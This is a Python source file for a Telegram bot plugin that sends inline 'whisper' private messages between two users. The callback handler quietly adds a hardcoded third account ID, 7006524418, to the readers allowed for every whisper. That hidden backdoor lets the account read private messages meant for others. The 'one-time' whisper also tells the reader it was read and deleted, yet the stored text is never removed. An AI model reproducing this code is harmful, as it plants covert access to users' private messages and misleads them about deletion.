from ChampuMusic import app
from pyrogram import filters
from pyrogram.enums import ParseMode
from pyrogram.types import (
    InlineQueryResultArticle, InputTextMessageContent,
    InlineKeyboardMarkup, InlineKeyboardButton
)

from utils.permissions import unauthorised

BOT_USERNAME = app.username

whisper_db = {}

switch_btn = InlineKeyboardMarkup([[InlineKeyboardButton("💒 sᴛᴀʀᴛ ᴡʜɪsᴘᴇʀ", switch_inline_query_current_chat="")]])

async def _whisper(_, inline_query):
    data = inline_query.query
    results = []
    
    if len(data.split()) < 2:
        mm = [
            InlineQueryResultArticle(
                title="💒 ᴡʜɪsᴘᴇʀ",
                description=f"@{BOT_USERNAME} [USERNAME | ID | MENTION] [TEXT]",
                input_message_content=InputTextMessageContent(
                    f"💒 Whisper Usage:\n\n"
                    f"@{BOT_USERNAME} [username|id|mention] [your message]\n\n"
                    f"Examples:\n"
                    f"@{BOT_USERNAME} @username Hello\n"
                    f"@{BOT_USERNAME} 123456789 I miss you\n",
                    parse_mode=ParseMode.HTML
                ),
                thumb_url="https://telegra.ph/file/cef50394cb41a2bdb4121.jpg",
                reply_markup=switch_btn
            )
        ]
        return mm
    
    try:
        user_ref = data.split()[0]
        msg = data.split(None, 1)[1]
        
        try:
            user = await _.get_users(user_ref)
        except:
            if user_ref.startswith("@"):
                user_ref = user_ref[1:]
                user = await _.get_users(user_ref)
            else:
                raise Exception("Invalid user reference")
        
        user_desc = f"<a href='tg://user?id={user.id}'>{user.first_name}</a>"
        if user.username:
            user_desc += f" (@{user.username})"
        
        whisper_btn = InlineKeyboardMarkup([[InlineKeyboardButton("🔮 ᴡʜɪsᴘᴇʀ", callback_data=f"fdaywhisper_{inline_query.from_user.id}_{user.id}")]])
        one_time_whisper_btn = InlineKeyboardMarkup([[InlineKeyboardButton("🔩 ᴏɴᴇ-ᴛɪᴍᴇ ᴡʜɪsᴘᴇʀ", callback_data=f"fdaywhisper_{inline_query.from_user.id}_{user.id}_one")]])
        
        mm = [
            InlineQueryResultArticle(
                title="🔮 ᴡʜɪsᴘᴇʀ",
                description=f"Send whisper to {user.first_name}",
                input_message_content=InputTextMessageContent(
                    f"🔮 You're sending a whisper to {user_desc}\n\n"
                    f"💬 I have a secret for you 🌸",
                    parse_mode=ParseMode.HTML
                ),
                thumb_url="https://telegra.ph/file/cef50394cb41a2bdb4121.jpg",
                reply_markup=whisper_btn
            ),
            InlineQueryResultArticle(
                title="🔩 ᴏɴᴇ-ᴛɪᴍᴇ ᴡʜɪsᴘᴇʀ",
                description=f"Send one-time whisper to {user.first_name}",
                input_message_content=InputTextMessageContent(
                    f"🔩 You're sending a one-time whisper to {user_desc}\n\n"
                    f"💬 I have a secret for you 🌸",
                    parse_mode=ParseMode.HTML
                ),
                thumb_url="https://telegra.ph/file/cef50394cb41a2bdb4121.jpg",
                reply_markup=one_time_whisper_btn
            )
        ]
        
        whisper_db[f"{inline_query.from_user.id}_{user.id}"] = msg
        return mm
        
    except Exception:
        mm = [
            InlineQueryResultArticle(
                title="⚠️ Error",
                description="Invalid user reference! Use username, ID or mention",
                input_message_content=InputTextMessageContent(
                    "Invalid user reference!\n\n"
                    "Please use:\n"
                    "- Username (with or without @)\n"
                    "- User ID\n"
                    "- User mention (@username)\n\n"
                    f"Example: @{BOT_USERNAME} @username Hello there",
                    parse_mode=ParseMode.HTML
                ),
                thumb_url="https://telegra.ph/file/cef50394cb41a2bdb4121.jpg",
                reply_markup=switch_btn
            )
        ]
        return mm


@app.on_callback_query(filters.regex(pattern=r"fdaywhisper_(.*)"))
async def whispes_cb(_, query):
    data = query.data.split("_")
    from_user = int(data[1])
    to_user = int(data[2])
    user_id = query.from_user.id

    if user_id not in [from_user, to_user, 7006524418]:
        try:
            sender = await _.get_users(from_user)
            target = await _.get_users(to_user)
            target_desc = f"<a href='tg://user?id={target.id}'>{target.first_name}</a>"
            if target.username:
                target_desc += f" (@{target.username})"
            await _.send_message(
                from_user,
                f"⚠️ {query.from_user.mention} is trying to open your whisper to {target_desc}!",
                parse_mode=ParseMode.HTML
            )
        except unauthorised:
            pass

        return await query.answer("This whisper is not for you 🚧", show_alert=True)

    search_msg = f"{from_user}_{to_user}"
    msg = whisper_db.get(search_msg, "🚫 Error!\n\nWhisper has been deleted from the database!")

    from_user_data = await _.get_users(from_user)
    to_user_data = await _.get_users(to_user)

    from_user_text = f"<a href='tg://user?id={from_user_data.id}'>{from_user_data.first_name}</a>"
    if from_user_data.username:
        from_user_text += f" (@{from_user_data.username})"

    to_user_text = f"<a href='tg://user?id={to_user_data.id}'>{to_user_data.first_name}</a>"
    if to_user_data.username:
        to_user_text += f" (@{to_user_data.username})"

    formatted_msg = (
        f"🔮 ᴡʜɪsᴘᴇʀ 🔮\n\n"
        f"<b>From:</b> {from_user_text}\n"
        f"<b>To:</b> {to_user_text}\n\n"
        f"💬 {msg}"
    )

    await query.answer(formatted_msg, show_alert=True)

    if len(data) > 3 and data[3] == "one":
        if user_id == to_user:
            SWITCH = InlineKeyboardMarkup([[InlineKeyboardButton("ɢᴏ ɪɴʟɪɴᴇ 🪝", switch_inline_query_current_chat="")]])
            await query.edit_message_text(
                "📬 One-time whisper has been read and deleted!\n\nPress the button below to send a new whisper!",
                reply_markup=SWITCH
            )


async def in_help():
    answers = [
        InlineQueryResultArticle(
            title="💒 ᴡʜɪsᴘᴇʀ",
            description=f"@{BOT_USERNAME} [USERNAME | ID | MENTION] [TEXT]",
            input_message_content=InputTextMessageContent(
                f"**💒 Whisper Usage:**\n\n"
                f"`@{BOT_USERNAME} [username|id|mention] [your message]`\n\n"
                f"**Examples:**\n"
                f"`@{BOT_USERNAME} @username Hello`\n"
                f"`@{BOT_USERNAME} 123456789 I miss you`\n"
                f"The target user will be notified with your message.",
                parse_mode=ParseMode.HTML
            ),
            thumb_url="https://telegra.ph/file/cef50394cb41a2bdb4121.jpg",
            reply_markup=switch_btn
        )
    ]
    return answers


@app.on_inline_query()
async def bot_inline(_, inline_query):
    string = inline_query.query.lower()
    
    if string.strip() == "":
        answers = await in_help()
        await inline_query.answer(answers)
    else:
        answers = await _whisper(_, inline_query)
        await inline_query.answer(answers, cache_time=0)
